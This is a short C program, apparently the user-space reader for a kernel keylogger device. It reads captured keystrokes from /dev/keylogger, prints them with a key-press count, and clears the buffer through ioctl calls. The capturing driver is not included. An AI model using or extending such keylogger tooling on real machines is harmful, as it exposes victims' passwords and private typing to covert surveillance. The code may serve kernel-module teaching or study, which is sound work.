#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <sys/ioctl.h>

#define DEVICE "/dev/keylogger"
#define IOCTL_CLEAR_BUFFER _IO('k', 1)
#define IOCTL_GET_COUNT    _IOR('k', 2, int)

int main() {
    int fd = open(DEVICE, O_RDONLY);
    if (fd < 0) {
        perror("Failed to open device");
        return 1;
    }

    printf("Reading logged keys...\n");

    char buf[1024] = {0};
    read(fd, buf, sizeof(buf));
    printf("Keys logged: %s\n", buf);

    int count = 0;
    ioctl(fd, IOCTL_GET_COUNT, &count);
    printf("Total keys pressed: %d\n", count);

    printf("Clearing buffer...\n");
    ioctl(fd, IOCTL_CLEAR_BUFFER);

    close(fd);
    return 0;
}

